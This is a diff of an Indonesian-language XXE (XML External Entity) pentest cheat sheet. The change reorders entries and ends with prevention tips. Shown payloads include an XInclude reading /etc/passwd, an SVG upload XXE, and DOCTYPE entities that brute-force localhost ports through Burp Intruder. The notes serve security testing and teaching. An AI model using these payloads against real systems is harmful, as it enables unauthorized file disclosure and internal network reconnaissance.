@@ -22,12 +22,6 @@ Sebelum memahami XXE, maka kita harus memiliki pengetahuan dasar XML, DTD dan en
     ```
     <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
     ```
-  - Test local machine port (gunakan burp intruder). Brute port dari ip local, lalu cek bergantian `http` dan `https`
-    ```
-    <!DOCTYPE xxe SYSTEM "http://127.0.0.1:§port§/">
-    <!DOCTYPE xxe SYSTEM "https://127.0.0.1:§port§/">
-    ```
-  - Exploiting [RSS validator](https://taind.wordpress.com/2017/12/25/root-me-xml-external-entity/). jika tidak punya server sendiri untuk upload file XML, gunakan [filebin](https://filebin.net/)
   - Exploiting via file upload. Caranya adalah dengan membuat file SVG yang mengandung exploit xxe
     ```
     <?xml version="1.0" standalone="yes"?>
@@ -49,7 +43,14 @@ Sebelum memahami XXE, maka kita harus memiliki pengetahuan dasar XML, DTD dan en
       Content-Type: text/xml
       Content-Length: 52
       <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
-      ```    
+      ```
+  - Test local machine port (gunakan burp intruder). Brute port dari ip local, lalu cek bergantian `http` dan `https`
+    ```
+    <!DOCTYPE xxe SYSTEM "http://127.0.0.1:§port§/">
+    <!DOCTYPE xxe SYSTEM "https://127.0.0.1:§port§/">
+    ```
+  - Exploiting [RSS validator](https://taind.wordpress.com/2017/12/25/root-me-xml-external-entity/). jika tidak punya server sendiri untuk upload file XML, gunakan [filebin](https://filebin.net/)
+
 ## Prevention**
   - Disable DTD
   - Disable entity saja
